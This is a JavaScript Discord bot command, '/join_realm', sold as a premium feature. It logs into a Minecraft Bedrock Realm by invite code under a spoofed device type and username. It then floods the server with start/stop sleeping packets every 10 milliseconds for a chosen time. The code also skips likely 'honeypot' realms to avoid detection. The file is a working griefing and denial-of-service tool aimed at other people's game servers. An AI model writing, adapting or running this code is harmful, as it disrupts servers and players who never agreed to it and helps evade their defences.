const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder, WebhookClient, PermissionsBitField } = require('discord.js');

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const webhookLoggingClient = new WebhookClient({ url: '' });
const trollEmojie = "<:HDtroll:1246615956176769024>";
const loadingemoji = "<a:loading:1256535355138768906>";
const workedEmojie = "<a:Check:1256612972793565204>";
const errorEmojie = "<:deny:1256622572762562681>";
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';

const deviceOptions = {
    'Unknown': 0,
    'Android': 1,
    'iOS': 2,
    'OSX': 3,
    'FireOS': 4,
    'GearVR': 5,
    'Hololens': 6,
    'Windows 10 (x64)': 7,
    'Windows 10 (x86)': 8,
    'Dedicated Server': 9,
    'TvOS': 10,
    'Orbis': 11,
    'Nintendo Switch': 12,
    'Xbox': 13,
    'Windows Phone': 14,
    'Linux': 15
};

let blacklistedUsers = new Set();
let honeypotRealms = new Set();

async function loadBlacklist() {
    try {
        const blacklistData = await fs.promises.readFile(blacklistPath, 'utf-8');
        blacklistedUsers = new Set(JSON.parse(blacklistData));
    } catch (error) {
        console.error('Error loading blacklist:', error);
    }
}

async function loadHoneypot() {
    try {
        const honeypotData = await fs.promises.readFile(honeypotPath, 'utf-8');
        honeypotRealms = new Set(JSON.parse(honeypotData));
    } catch (error) {
        console.error('Error loading honeypot file:', error);
    }
}

loadBlacklist();
loadHoneypot();

module.exports = {
    command: new SlashCommandBuilder()
        .setName('join_realm')
        .setDescription('Joins a realm with sub-clients')
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Join')
                .setRequired(true)
                .setMinLength(11)
                .setMaxLength(11)
        )
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('The device to spoof as')
                .setRequired(true)
                .addChoices(
                    { name: 'Unknown', value: 'Unknown' },
                    { name: 'Android', value: 'Android' },
                    { name: 'Samsung Smart fridge', value: 'Android' },
                    { name: 'iOS', value: 'iOS' },
                    { name: 'Ocean Gate', value: 'OSX' },
                    { name: 'OSX (macOS)', value: 'OSX' },
                    { name: 'FireOS', value: 'FireOS' },
                    { name: 'GearVR', value: 'GearVR' },
                    { name: 'Hololens', value: 'Hololens' },
                    { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
                    { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
                    { name: 'Dedicated Server', value: 'Dedicated Server' },
                    { name: 'TvOS', value: 'TvOS' },
                    { name: 'Orbis', value: 'Orbis' },
                    { name: 'Nintendo Switch', value: 'Nintendo Switch' },
                    { name: 'Xbox', value: 'Xbox' },
                    { name: 'Windows Phone', value: 'Windows Phone' },
                    { name: 'Linux', value: 'Linux' }
                )
        )
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Username for the sub-client')
                .setRequired(true)
        )
        .addIntegerOption(option =>
            option.setName('time')
                .setDescription('Time in seconds to stay connected')
                .setRequired(true)
        ),

    callback: async (interaction) => {
        try {
            const requiredRole = '1261656302598492200'; // Replace with the actual role ID
            if (!interaction.member.roles.cache.has(requiredRole)) {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('No Premium ?!?')
                    .setDescription(`${errorEmojie} This is a Premium Command ${errorEmojie} \n Boost this Server: https://discord.gg/armbe to get Premium`);
                await interaction.reply({ embeds: [errorEmbed], ephemeral: false });
                return;
            }

            await interaction.deferReply({ ephemeral: true });

            const userId = interaction.user.id;
            const userTag = interaction.user.tag;
            const realmCode = interaction.options.getString('realmcode');
            const deviceOS = interaction.options.getString('device_os');
            const username = interaction.options.getString('username');
            const time = interaction.options.getInteger('time');

            if (blacklistedUsers.has(userId)) {
                const embed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Womp Womp')
                    .setDescription(`${lEmoji} You are Blacklisted ${lEmoji}`);
                await interaction.editReply({ embeds: [embed], ephemeral: true });

                const webhookEmbed = new EmbedBuilder()
                    .setTitle('Blacklist Check')
                    .setDescription(`User \`${userTag}\` attempted to use the \`/join_realm\` command but is blacklisted.`)
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Realm Code', value: realmCode },
                        { name: 'Device', value: deviceOS },
                        { name: 'Username', value: username }
                    )
                    .setTimestamp();

                await webhookLoggingClient.send({ embeds: [webhookEmbed] });
                return;
            }

            const realmData = await checkCodes([realmCode]);
            if (realmData[0].playerCount === 0 || (realmData[0].status === 'error' && realmData[0].error.includes('503'))) {
                honeypotRealms.add(realmCode);
                await fs.promises.writeFile(honeypotPath, JSON.stringify([...honeypotRealms], null, 2));

                const honeypotEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Honeypot Detected')
                    .setDescription(`${errorEmojie}This realm is a honeypot and cannot be joined${errorEmojie}`);
                await interaction.editReply({ embeds: [honeypotEmbed], ephemeral: true });

                const webhookHoneypotEmbed = new EmbedBuilder()
                    .setTitle('Honeypot Detected')
                    .setDescription(`User \`${userTag}\` attempted to join a honeypot realm.`)
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Realm Code', value: realmCode },
                        { name: 'Device', value: deviceOS },
                        { name: 'Username', value: username }
                    )
                    .setTimestamp();

                await webhookLoggingClient.send({ embeds: [webhookHoneypotEmbed] });
                return;
            }

            const authFlow = new Authflow('unique_identifier', './', {
                authTitle: '00000000402b5328',
                flow: 'live'
            });

            const bedrockClient = bedrock.createClient({
                authFlow: authFlow,
                username: username,
                deviceOS: deviceOptions[deviceOS],
                realms: {
                    realmInvite: `https://realms.gg/${realmCode}`
                }
            });

            bedrockClient.on('start_game', async (packet) => {
                const initialEmbed = new EmbedBuilder()
                    .setTitle(`${trollEmojie} Joined ${realmCode} ${trollEmojie}`)
                    .setDescription(`Joined ${realmCode} with username ${username}`)
                    .addFields(
                        { name: 'Device', value: deviceOS, inline: true },
                        { name: 'Connected', value: workedEmojie, inline: false },
                        { name: 'Sending Sleep Packets', value: '...', inline: false }
                    )
                    .setFooter({ text: `This command will be sent to our logging channel!` })
                    .setTimestamp();

                await interaction.editReply({ embeds: [initialEmbed] });

                const action_packet = {
                    runtime_entity_id: packet.runtime_entity_id,
                    position: { x: 0, y: 0, z: 0 },
                    result_position: { x: 0, y: 0, z: 0 },
                    face: 0
                };

                const sendSleepPackets = () => {
                    bedrockClient.write("player_action", {
                        ...action_packet,
                        action: 'start_sleeping'
                    });

                    bedrockClient.write("player_action", {
                        ...action_packet,
                        action: 'stop_sleeping'
                    });
                };

                const intervalId = setInterval(sendSleepPackets, 10);

                setTimeout(() => {
                    clearInterval(intervalId);
                    bedrockClient.disconnect();
                    initialEmbed.spliceFields(2, 1, { name: 'Sending Sleep Packets', value: 'Done' });
                    initialEmbed.addFields({ name: 'Disconnected', value: workedEmojie, inline: false });
                    interaction.editReply({ embeds: [initialEmbed] });
                    console.log(`Disconnected from ${realmCode}`);

                    const webhookEmbed = new EmbedBuilder()
                        .setTitle('Realm Joined and Disconnected')
                        .setDescription(`User ${interaction.user.tag} used the \`/join_realm\` command.`)
                        .setColor('Green')
                        .addFields(
                            { name: 'Realm Code', value: realmCode },
                            { name: 'Device', value: deviceOS },
                            { name: 'Username', value: username }
                        )
                        .setTimestamp();

                    webhookLoggingClient.send({ embeds: [webhookEmbed] });
                }, time * 1000); // Time to stay connected
            });

            bedrockClient.on('kick', async (packet) => {
                const kickMessages = {
                    "disconnectionScreen.outdatedClient": "This realm is currently on a version that is not supported.",
                };

                const reasonMessage = kickMessages[packet.reason] || "An unknown error occurred.";
                const initialEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Error')
                    .setDescription(`${errorEmojie} ${reasonMessage} ${errorEmojie}`)
                    .addFields(
                        { name: 'Device', value: deviceOS, inline: true },
                        { name: 'Realm Code', value: realmCode, inline: true },
                        { name: 'Username', value: username, inline: true }
                    );
                await interaction.editReply({ embeds: [initialEmbed] });
                bedrockClient.disconnect();  // Stop further operations
            });

            bedrockClient.on('kick', async (reason) => {
                const initialEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Kicked')
                    .setDescription(`${errorEmojie} ${reason.message} ${errorEmojie}`)
                    .addFields(
                        { name: 'Device', value: deviceOS, inline: true },
                        { name: 'Realm Code', value: realmCode, inline: true },
                        { name: 'Username', value: username, inline: true }
                    );
                await interaction.editReply({ embeds: [initialEmbed] });
                bedrockClient.disconnect();  // Stop further operations
            });

            bedrockClient.on('error', async (err) => {
                const initialEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Error')
                    .setDescription(`${errorEmojie} ${err.message} ${errorEmojie}`)
                    .addFields(
                        { name: 'Device', value: deviceOS, inline: true },
                        { name: 'Realm Code', value: realmCode, inline: true },
                        { name: 'Username', value: username, inline: true }
                    );
                await interaction.editReply({ embeds: [initialEmbed] });
                bedrockClient.disconnect();  // Stop further operations
            });

        } catch (error) {
            console.error('Unexpected error:', error);
            const errorEmbed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('Unexpected Error')
                .setDescription('An unexpected error occurred.')
                .addFields({ name: 'Error', value: error.message, inline: false });
            await interaction.editReply({ embeds: [errorEmbed] });
        }
    }
};

async function checkCodes(codes) {
    const profilesFolder = './';
    const options = {
        authTitle: '00000000402b5328',
        flow: 'live'
    };

    const userIdentifier = 'unique_identifier';
    const authFlow = new Authflow(userIdentifier, profilesFolder, options);
    const api = RealmAPI.from(authFlow, 'bedrock');

    const checkPromises = codes.map(async (code) => {
        try {
            const realm = await api.getRealmFromInvite(code);
            if (!realm) {
                return { code, status: 'invalid' };
            }

            const address = await realm.getAddress();
            const realmData = await api.getRealm(realm.id);
            const playerCount = realmData.players.length;

            return {
                code,
                status: 'valid',
                realmName: realm.name,
                realmId: realm.id,
                host: address.host,
                port: address.port,
                playerCount
            };
        } catch (error) {
            if (error.message.includes('403')) {
                console.error('User found in block list:', error);
                throw new Error('User found in block list');
            }
            console.error('Error fetching realm data:', error);
            return { code, status: 'error', error: error.message };
        }
    });

    try {
        return await Promise.all(checkPromises);
    } catch (error) {
        console.error('Error fetching data:', error);
        throw new Error('Error fetching data');
    }
}
